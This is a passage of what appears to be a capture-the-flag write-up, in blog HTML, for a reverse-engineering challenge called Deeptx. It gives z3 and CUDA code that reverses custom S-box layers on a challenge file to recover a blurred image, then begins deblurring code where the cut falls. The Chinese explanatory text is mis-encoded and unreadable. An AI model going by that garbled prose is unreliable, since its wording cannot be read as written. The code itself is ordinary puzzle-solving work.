‡ï¼Œè¿™è¾¹ä¸€å…±å°†0x10000æ•°æ®åˆ†ä¸º16å—ï¼Œä¹Ÿå°±æ˜¯16ä¸ªè¿›ç¨‹åŒæ—¶è·‘ï¼Œæ‰€ä»¥è¿è¡Œè„šæœ¬numå¾—ä»0-15éƒ½ä¸€èµ·è¿è¡Œï¼Œæœ€åç”Ÿæˆ16ä»½åˆ†å—çš„è§£å¯†æ•°æ®ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">sbox = [</span><br><span class="line">    <span class="number">0xD6</span>, <span class="number">0x90</span>, <span class="number">0xE9</span>, <span class="number">0xFE</span>, <span class="number">0xCC</span>, <span class="number">0xE1</span>, <span class="number">0x3D</span>, <span class="number">0xB7</span>, <span class="number">0x16</span>, <span class="number">0xB6</span>,</span><br><span class="line">    <span class="number">0x14</span>, <span class="number">0xC2</span>, <span class="number">0x28</span>, <span class="number">0xFB</span>, <span class="number">0x2C</span>, <span class="number">0x05</span>, <span class="number">0x2B</span>, <span class="number">0x67</span>, <span class="number">0x9A</span>, <span class="number">0x76</span>,</span><br><span class="line">    <span class="number">0x2A</span>, <span class="number">0xBE</span>, <span class="number">0x04</span>, <span class="number">0xC3</span>, <span class="number">0xAA</span>, <span class="number">0x44</span>, <span class="number">0x13</span>, <span class="number">0x26</span>, <span class="number">0x49</span>, <span class="number">0x86</span>,</span><br><span class="line">    <span class="number">0x06</span>, <span class="number">0x99</span>, <span class="number">0x9C</span>, <span class="number">0x42</span>, <span class="number">0x50</span>, <span class="number">0xF4</span>, <span class="number">0x91</span>, <span class="number">0xEF</span>, <span class="number">0x98</span>, <span class="number">0x7A</span>,</span><br><span class="line">    <span class="number">0x33</span>, <span class="number">0x54</span>, <span class="number">0x0B</span>, <span class="number">0x43</span>, <span class="number">0xED</span>, <span class="number">0xCF</span>, <span class="number">0xAC</span>, <span class="number">0x62</span>, <span class="number">0xE4</span>, <span class="number">0xB3</span>,</span><br><span class="line">    <span class="number">0x1C</span>, <span class="number">0xA9</span>, <span class="number">0xC9</span>, <span class="number">0x08</span>, <span class="number">0xE8</span>, <span class="number">0x95</span>, <span class="number">0x80</span>, <span class="number">0xDF</span>, <span class="number">0x94</span>, <span class="number">0xFA</span>,</span><br><span class="line">    <span class="number">0x75</span>, <span class="number">0x8F</span>, <span class="number">0x3F</span>, <span class="number">0xA6</span>, <span class="number">0x47</span>, <span class="number">0x07</span>, <span class="number">0xA7</span>, <span class="number">0xFC</span>, <span class="number">0xF3</span>, <span class="number">0x73</span>,</span><br><span class="line">    <span class="number">0x17</span>, <span class="number">0xBA</span>, <span class="number">0x83</span>, <span class="number">0x59</span>, <span class="number">0x3C</span>, <span class="number">0x19</span>, <span class="number">0xE6</span>, <span class="number">0x85</span>, <span class="number">0x4F</span>, <span class="number">0xA8</span>,</span><br><span class="line">    <span class="number">0x68</span>, <span class="number">0x6B</span>, <span class="number">0x81</span>, <span class="number">0xB2</span>, <span class="number">0x71</span>, <span class="number">0x64</span>, <span class="number">0xDA</span>, <span class="number">0x8B</span>, <span class="number">0xF8</span>, <span class="number">0xEB</span>,</span><br><span class="line">    <span class="number">0x0F</span>, <span class="number">0x4B</span>, <span class="number">0x70</span>, <span class="number">0x56</span>, <span class="number">0x9D</span>, <span class="number">0x35</span>, <span class="number">0x1E</span>, <span class="number">0x24</span>, <span class="number">0x0E</span>, <span class="number">0x5E</span>,</span><br><span class="line">    <span class="number">0x63</span>, <span class="number">0x58</span>, <span class="number">0xD1</span>, <span class="number">0xA2</span>, <span class="number">0x25</span>, <span class="number">0x22</span>, <span class="number">0x7C</span>, <span class="number">0x3B</span>, <span class="number">0x01</span>, <span class="number">0x21</span>,</span><br><span class="line">    <span class="number">0x78</span>, <span class="number">0x87</span>, <span class="number">0xD4</span>, <span class="number">0x00</span>, <span class="number">0x46</span>, <span class="number">0x57</span>, <span class="number">0x9F</span>, <span class="number">0xD3</span>, <span class="number">0x27</span>, <span class="number">0x52</span>,</span><br><span class="line">    <span class="number">0x4C</span>, <span class="number">0x36</span>, <span class="number">0x02</span>, <span class="number">0xE7</span>, <span class="number">0xA0</span>, <span class="number">0xC4</span>, <span class="number">0xC8</span>, <span class="number">0x9E</span>, <span class="number">0xEA</span>, <span class="number">0xBF</span>,</span><br><span class="line">    <span class="number">0x8A</span>, <span class="number">0xD2</span>, <span class="number">0x40</span>, <span class="number">0xC7</span>, <span class="number">0x38</span>, <span class="number">0xB5</span>, <span class="number">0xA3</span>, <span class="number">0xF7</span>, <span class="number">0xF2</span>, <span class="number">0xCE</span>,</span><br><span class="line">    <span class="number">0xF9</span>, <span class="number">0x61</span>, <span class="number">0x15</span>, <span class="number">0xA1</span>, <span class="number">0xE0</span>, <span class="number">0xAE</span>, <span class="number">0x5D</span>, <span class="number">0xA4</span>, <span class="number">0x9B</span>, <span class="number">0x34</span>,</span><br><span class="line">    <span class="number">0x1A</span>, <span class="number">0x55</span>, <span class="number">0xAD</span>, <span class="number">0x93</span>, <span class="number">0x32</span>, <span class="number">0x30</span>, <span class="number">0xF5</span>, <span class="number">0x8C</span>, <span class="number">0xB1</span>, <span class="number">0xE3</span>,</span><br><span class="line">    <span class="number">0x1D</span>, <span class="number">0xF6</span>, <span class="number">0xE2</span>, <span class="number">0x2E</span>, <span class="number">0x82</span>, <span class="number">0x66</span>, <span class="number">0xCA</span>, <span class="number">0x60</span>, <span class="number">0xC0</span>, <span class="number">0x29</span>,</span><br><span class="line">    <span class="number">0x23</span>, <span class="number">0xAB</span>, <span class="number">0x0D</span>, <span class="number">0x53</span>, <span class="number">0x4E</span>, <span class="number">0x6F</span>, <span class="number">0xD5</span>, <span class="number">0xDB</span>, <span class="number">0x37</span>, <span class="number">0x45</span>,</span><br><span class="line">    <span class="number">0xDE</span>, <span class="number">0xFD</span>, <span class="number">0x8E</span>, <span class="number">0x2F</span>, <span class="number">0x03</span>, <span class="number">0xFF</span>, <span class="number">0x6A</span>, <span class="number">0x72</span>, <span class="number">0x6D</span>, <span class="number">0x6C</span>,</span><br><span class="line">    <span class="number">0x5B</span>, <span class="number">0x51</span>, <span class="number">0x8D</span>, <span class="number">0x1B</span>, <span class="number">0xAF</span>, <span class="number">0x92</span>, <span class="number">0xBB</span>, <span class="number">0xDD</span>, <span class="number">0xBC</span>, <span class="number">0x7F</span>,</span><br><span class="line">    <span class="number">0x11</span>, <span class="number">0xD9</span>, <span class="number">0x5C</span>, <span class="number">0x41</span>, <span class="number">0x1F</span>, <span class="number">0x10</span>, <span class="number">0x5A</span>, <span class="number">0xD8</span>, <span class="number">0x0A</span>, <span class="number">0xC1</span>,</span><br><span class="line">    <span class="number">0x31</span>, <span class="number">0x88</span>, <span class="number">0xA5</span>, <span class="number">0xCD</span>, <span class="number">0x7B</span>, <span class="number">0xBD</span>, <span class="number">0x2D</span>, <span class="number">0x74</span>, <span class="number">0xD0</span>, <span class="number">0x12</span>,</span><br><span class="line">    <span class="number">0xB8</span>, <span class="number">0xE5</span>, <span class="number">0xB4</span>, <span class="number">0xB0</span>, <span class="number">0x89</span>, <span class="number">0x69</span>, <span class="number">0x97</span>, <span class="number">0x4A</span>, <span class="number">0x0C</span>, <span class="number">0x96</span>,</span><br><span class="line">    <span class="number">0x77</span>, <span class="number">0x7E</span>, <span class="number">0x65</span>, <span class="number">0xB9</span>, <span class="number">0xF1</span>, <span class="number">0x09</span>, <span class="number">0xC5</span>, <span class="number">0x6E</span>, <span class="number">0xC6</span>, <span class="number">0x84</span>,</span><br><span class="line">    <span class="number">0x18</span>, <span class="number">0xF0</span>, <span class="number">0x7D</span>, <span class="number">0xEC</span>, <span class="number">0x3A</span>, <span class="number">0xDC</span>, <span class="number">0x4D</span>, <span class="number">0x20</span>, <span class="number">0x79</span>, <span class="number">0xEE</span>,</span><br><span class="line">    <span class="number">0x5F</span>, <span class="number">0x3E</span>, <span class="number">0xD7</span>, <span class="number">0xCB</span>, <span class="number">0x39</span>, <span class="number">0x48</span> </span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">tbox = [</span><br><span class="line">    <span class="number">0x62</span>, <span class="number">0x7C</span>, <span class="number">0x76</span>, <span class="number">0x7A</span>, <span class="number">0xF2</span>, <span class="number">0x6A</span>, <span class="number">0x6E</span>, <span class="number">0xC4</span>, <span class="number">0x30</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x66</span>, <span class="number">0x2A</span>, <span class="number">0xFE</span>, <span class="number">0xD6</span>, <span class="number">0xAA</span>, <span class="number">0x76</span>, <span class="number">0xCA</span>, <span class="number">0x82</span>, <span class="number">0xC8</span>, <span class="number">0x7C</span>,</span><br><span class="line">    <span class="number">0xFA</span>, <span class="number">0x58</span>, <span class="number">0x46</span>, <span class="number">0xF0</span>, <span class="number">0xAC</span>, <span class="number">0xD4</span>, <span class="number">0xA2</span>, <span class="number">0xAE</span>, <span class="number">0x9C</span>, <span class="number">0xA4</span>,</span><br><span class="line">    <span class="number">0x72</span>, <span class="number">0xC0</span>, <span class="number">0xB6</span>, <span class="number">0xFC</span>, <span class="number">0x92</span>, <span class="number">0x26</span>, <span class="number">0x36</span>, <span class="number">0x3E</span>, <span class="number">0xF6</span>, <span class="number">0xCC</span>,</span><br><span class="line">    <span class="number">0x34</span>, <span class="number">0xA4</span>, <span class="number">0xE4</span>, <span class="number">0xF0</span>, <span class="number">0x70</span>, <span class="number">0xD8</span>, <span class="number">0x30</span>, <span class="number">0x14</span>, <span class="number">0x04</span>, <span class="number">0xC6</span>,</span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0xC2</span>, <span class="number">0x18</span>, <span class="number">0x96</span>, <span class="number">0x04</span>, <span class="number">0x9A</span>, <span class="number">0x06</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0xE2</span>,</span><br><span class="line">    <span class="number">0xEA</span>, <span class="number">0x26</span>, <span class="number">0xB2</span>, <span class="number">0x74</span>, <span class="number">0x08</span>, <span class="number">0x82</span>, <span class="number">0x2C</span>, <span class="number">0x1A</span>, <span class="number">0x1A</span>, <span class="number">0x6E</span>,</span><br><span class="line">    <span class="number">0x5A</span>, <span class="number">0xA0</span>, <span class="number">0x52</span>, <span class="number">0x3A</span>, <span class="number">0xD6</span>, <span class="number">0xB2</span>, <span class="number">0x28</span>, <span class="number">0xE2</span>, <span class="number">0x2E</span>, <span class="number">0x84</span>,</span><br><span class="line">    <span class="number">0x52</span>, <span class="number">0xD0</span>, <span class="number">0x00</span>, <span class="number">0xEC</span>, <span class="number">0x20</span>, <span class="number">0xFC</span>, <span class="number">0xB0</span>, <span class="number">0x5A</span>, <span class="number">0x6A</span>, <span class="number">0xCA</span>,</span><br><span class="line">    <span class="number">0xBE</span>, <span class="number">0x38</span>, <span class="number">0x4A</span>, <span class="number">0x4C</span>, <span class="number">0x58</span>, <span class="number">0xCE</span>, <span class="number">0xD0</span>, <span class="number">0xEE</span>, <span class="number">0xAA</span>, <span class="number">0xFA</span>,</span><br><span class="line">    <span class="number">0x42</span>, <span class="number">0x4C</span>, <span class="number">0x32</span>, <span class="number">0x84</span>, <span class="number">0x44</span>, <span class="number">0xF8</span>, <span class="number">0x02</span>, <span class="number">0x7E</span>, <span class="number">0x50</span>, <span class="number">0x3C</span>,</span><br><span class="line">    <span class="number">0x9E</span>, <span class="number">0xA8</span>, <span class="number">0x50</span>, <span class="number">0xA2</span>, <span class="number">0x40</span>, <span class="number">0x8E</span>, <span class="number">0x92</span>, <span class="number">0x9C</span>, <span class="number">0x38</span>, <span class="number">0xF4</span>,</span><br><span class="line">    <span class="number">0xBC</span>, <span class="number">0xB6</span>, <span class="number">0xDA</span>, <span class="number">0x20</span>, <span class="number">0x10</span>, <span class="number">0xFE</span>, <span class="number">0xF2</span>, <span class="number">0xD2</span>, <span class="number">0xCC</span>, <span class="number">0x0C</span>,</span><br><span class="line">    <span class="number">0x12</span>, <span class="number">0xEC</span>, <span class="number">0x5E</span>, <span class="number">0x96</span>, <span class="number">0x44</span>, <span class="number">0x16</span>, <span class="number">0xC4</span>, <span class="number">0xA6</span>, <span class="number">0x7E</span>, <span class="number">0x3C</span>,</span><br><span class="line">    <span class="number">0x64</span>, <span class="number">0x5C</span>, <span class="number">0x18</span>, <span class="number">0x72</span>, <span class="number">0x60</span>, <span class="number">0x80</span>, <span class="number">0x4E</span>, <span class="number">0xDC</span>, <span class="number">0x22</span>, <span class="number">0x2A</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x88</span>, <span class="number">0x46</span>, <span class="number">0xEF</span>, <span class="number">0xB8</span>, <span class="number">0x14</span>, <span class="number">0xDE</span>, <span class="number">0x5E</span>, <span class="number">0x0A</span>, <span class="number">0xDA</span>,</span><br><span class="line">    <span class="number">0xE0</span>, <span class="number">0x32</span>, <span class="number">0x3A</span>, <span class="number">0x0A</span>, <span class="number">0x48</span>, <span class="number">0x06</span>, <span class="number">0x24</span>, <span class="number">0x5C</span>, <span class="number">0xC2</span>, <span class="number">0xD2</span>,</span><br><span class="line">    <span class="number">0xAC</span>, <span class="number">0x62</span>, <span class="number">0x90</span>, <span class="number">0x94</span>, <span class="number">0xE4</span>, <span class="number">0x78</span>, <span class="number">0xE6</span>, <span class="number">0xC8</span>, <span class="number">0x36</span>, <span class="number">0x6C</span>,</span><br><span class="line">    <span class="number">0x8C</span>, <span class="number">0xD4</span>, <span class="number">0x4E</span>, <span class="number">0xA8</span>, <span class="number">0x6C</span>, <span class="number">0x56</span>, <span class="number">0xF4</span>, <span class="number">0xEA</span>, <span class="number">0x64</span>, <span class="number">0x7A</span>,</span><br><span class="line">    <span class="number">0xAE</span>, <span class="number">0x08</span>, <span class="number">0xBA</span>, <span class="number">0x78</span>, <span class="number">0x24</span>, <span class="number">0x2E</span>, <span class="number">0x1C</span>, <span class="number">0xA6</span>, <span class="number">0xB4</span>, <span class="number">0xC6</span>,</span><br><span class="line">    <span class="number">0xE8</span>, <span class="number">0xDC</span>, <span class="number">0x74</span>, <span class="number">0x1E</span>, <span class="number">0x4A</span>, <span class="number">0xBC</span>, <span class="number">0x8A</span>, <span class="number">0x8A</span>, <span class="number">0x70</span>, <span class="number">0x3E</span>,</span><br><span class="line">    <span class="number">0xB4</span>, <span class="number">0x66</span>, <span class="number">0x48</span>, <span class="number">0x02</span>, <span class="number">0xF6</span>, <span class="number">0x0E</span>, <span class="number">0x60</span>, <span class="number">0x34</span>, <span class="number">0x56</span>, <span class="number">0xB8</span>,</span><br><span class="line">    <span class="number">0x86</span>, <span class="number">0xC0</span>, <span class="number">0x1C</span>, <span class="number">0x9E</span>, <span class="number">0xE0</span>, <span class="number">0xF8</span>, <span class="number">0x98</span>, <span class="number">0x10</span>, <span class="number">0x68</span>, <span class="number">0xD8</span>,</span><br><span class="line">    <span class="number">0x8E</span>, <span class="number">0x94</span>, <span class="number">0x9A</span>, <span class="number">0x1E</span>, <span class="number">0x86</span>, <span class="number">0xE8</span>, <span class="number">0xCE</span>, <span class="number">0x54</span>, <span class="number">0x28</span>, <span class="number">0xDE</span>,</span><br><span class="line">    <span class="number">0x8C</span>, <span class="number">0xA0</span>, <span class="number">0x88</span>, <span class="number">0x0C</span>, <span class="number">0xBE</span>, <span class="number">0xE6</span>, <span class="number">0x42</span>, <span class="number">0x68</span>, <span class="number">0x40</span>, <span class="number">0x98</span>,</span><br><span class="line">    <span class="number">0x2C</span>, <span class="number">0x0E</span>, <span class="number">0xB0</span>, <span class="number">0x54</span>, <span class="number">0xBA</span>, <span class="number">0x16</span> </span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_input</span>(<span class="params">vArray,Size</span>):</span><br><span class="line">    s = Solver()</span><br><span class="line"></span><br><span class="line">    Input = [[BitVec(<span class="string">f&#x27;input_<span class="subst">&#123;i&#125;</span>_<span class="subst">&#123;j&#125;</span>&#x27;</span>, <span class="number">8</span>) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(Size)]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> bid <span class="keyword">in</span> <span class="built_in">range</span>(Size):</span><br><span class="line">        <span class="keyword">for</span> tid <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            tmp = sbox[tid]</span><br><span class="line">            <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">                <span class="built_in">sum</span> += (tbox[tmp&amp;<span class="number">0xff</span>] * Input[bid][i])&amp;<span class="number">0xffff</span></span><br><span class="line">                tmp = (tmp*<span class="number">5</span>+<span class="number">17</span>)&amp;<span class="number">0xff</span></span><br><span class="line"></span><br><span class="line">            s.add(<span class="built_in">sum</span> == vArray[bid*<span class="number">256</span>+tid])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> s.check() == sat:</span><br><span class="line">        model = s.model()</span><br><span class="line">        result = [[model.evaluate(Input[i][j]).as_long() </span><br><span class="line">                  <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)] </span><br><span class="line">                  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(Size)]</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">num = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&#x27;Steg2&#x27;</span> , <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read(<span class="number">0x10000</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&#x27;Steg3_part&#x27;</span>+<span class="built_in">str</span>(num),<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> out_f:</span><br><span class="line">    start = num * <span class="number">16</span> * <span class="number">256</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Running...&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        block = data[start + i * <span class="number">256</span> : start + i * <span class="number">256</span> + <span class="number">256</span> * <span class="number">1</span>]</span><br><span class="line">        In_ = [b <span class="keyword">for</span> b <span class="keyword">in</span> block]</span><br><span class="line">        </span><br><span class="line">        result = solve_input(In_, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> result:</span><br><span class="line">            <span class="keyword">for</span> row <span class="keyword">in</span> result:</span><br><span class="line">                out_f.write(<span class="built_in">bytes</span>(row))</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Finished &#x27;</span> + <span class="built_in">str</span>(i) + <span class="string">&#x27; block&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Finished all.&#x27;</span>)</span><br></pre></td></tr></table></figure><p>æœ€åLayer3å‰åŠéƒ¨åˆ†è§£å¯†+Layer2è§£å¯†cudaä»£ç ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">readFile</span><span class="params">(<span class="type">const</span> std::string&amp; filename, <span class="type">uint8_t</span>* buffer, <span class="type">size_t</span> startPos, <span class="type">size_t</span> bufferSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">std::ifstream <span class="title">file</span><span class="params">(filename, std::ios::binary)</span></span>;</span><br><span class="line">    <span class="keyword">if</span> (!file.<span class="built_in">is_open</span>()) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    file.<span class="built_in">seekg</span>(startPos);</span><br><span class="line"></span><br><span class="line">    file.<span class="built_in">read</span>(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">char</span>*&gt;(buffer), bufferSize);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">writeToFile</span><span class="params">(<span class="type">const</span> std::string&amp; filename, <span class="type">const</span> <span class="type">uint8_t</span>* data, <span class="type">size_t</span> size)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">std::ofstream <span class="title">file</span><span class="params">(filename, std::ios::binary)</span></span>;</span><br><span class="line">    <span class="keyword">if</span> (!file.<span class="built_in">is_open</span>()) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    file.<span class="built_in">write</span>(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">const</span> <span class="type">char</span>*&gt;(data), size);</span><br><span class="line"></span><br><span class="line">    file.<span class="built_in">close</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">        invSbox[sbox[i]] = i;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span>* Input = <span class="keyword">new</span> <span class="type">uint8_t</span>[<span class="number">256</span> * <span class="number">256</span>];</span><br><span class="line">    <span class="comment">// è¯»å–16å—è§£å¯†æ•°æ®åˆå¹¶</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">readFile</span>(<span class="string">&quot;Steg3_part&quot;</span> + std::<span class="built_in">to_string</span>(i),Input + i * <span class="number">16</span> * <span class="number">256</span>, <span class="number">0</span>, <span class="number">0x10000</span> / <span class="number">16</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cudaMemcpyToSymbol</span>(cuda_sbox, sbox, <span class="number">256</span>, <span class="number">0</span>, cudaMemcpyHostToDevice);</span><br><span class="line">    <span class="built_in">cudaMemcpyToSymbol</span>(cuda_tbox, tbox, <span class="number">256</span>, <span class="number">0</span>, cudaMemcpyHostToDevice);</span><br><span class="line">    <span class="built_in">cudaMemcpyToSymbol</span>(cuda_invsbox, invSbox, <span class="number">256</span>, <span class="number">0</span>, cudaMemcpyHostToDevice);</span><br><span class="line">    <span class="type">uint8_t</span>* InPtr&#123;&#125;, * OutPtr&#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cudaMalloc</span>(&amp;InPtr, <span class="number">0x10000</span>);</span><br><span class="line">    <span class="built_in">cudaMalloc</span>(&amp;OutPtr, <span class="number">0x10000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cudaMemcpy</span>(InPtr, Input, <span class="number">0x10000</span>, cudaMemcpyHostToDevice);</span><br><span class="line"></span><br><span class="line">    <span class="function">dim3 <span class="title">Blocks</span><span class="params">(<span class="number">256</span>, <span class="number">1</span>, <span class="number">1</span>)</span>, <span class="title">Threads</span><span class="params">(<span class="number">256</span>, <span class="number">1</span>, <span class="number">1</span>)</span></span>;</span><br><span class="line">    Re_Layer3_part2 &lt;&lt; &lt;Blocks, Threads &gt;&gt; &gt; (InPtr, OutPtr);</span><br><span class="line">    <span class="built_in">cudaDeviceSynchronize</span>();</span><br><span class="line"></span><br><span class="line">    Re_Layer2 &lt;&lt; &lt;Blocks, Threads &gt;&gt; &gt; (OutPtr, InPtr);</span><br><span class="line">    <span class="built_in">cudaDeviceSynchronize</span>();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cudaMemcpy</span>(Input, InPtr, <span class="number">0x10000</span>, cudaMemcpyDeviceToHost);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">writeToFile</span>(<span class="string">&quot;Layer2_Decrypted&quot;</span>, Input, <span class="number">0x10000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cudaFree</span>(InPtr);</span><br><span class="line">    <span class="built_in">cudaFree</span>(OutPtr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span>[] Input;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€åå¾—åˆ°Layer1åŠ å¯†åçš„å›¾ç‰‡ï¼Œæ˜¯ç»è¿‡åŠ¨æ€æ¨¡ç³Šå·ç§¯åçš„ï¼Œä¸å¯å®Œå…¨é€†å‘ï¼Œåªèƒ½ç”¨ç®—æ³•è¿›è¡Œæ¸…æ™°åŒ–å¤„ç†ã€‚</p><p><img src="/2025/04/27/ACTF-Deeptx/image-2.png" alt="alt text"></p><p>å»æ¨¡ç³Šä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 